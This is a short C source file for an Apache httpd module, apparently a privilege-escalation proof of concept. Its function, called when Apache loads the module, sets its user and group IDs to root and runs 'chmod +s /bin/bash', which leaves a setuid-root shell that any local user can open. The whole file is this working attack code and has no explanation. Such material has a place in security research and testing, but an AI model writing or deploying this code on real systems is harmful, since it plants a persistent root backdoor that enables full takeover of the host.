#include "httpd.h"
#include "http_config.h"
#include "http_protocol.h"
#include "ap_config.h"
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

static void poc(){
  setuid(0); 
  setgid(0);
  system("chmod +s /bin/bash");
}

module AP_MODULE_DECLARE_DATA my_module = {
  STANDARD20_MODULE_STUFF,
  NULL,
  NULL,
  NULL,
  NULL,
  NULL,
  poc
};
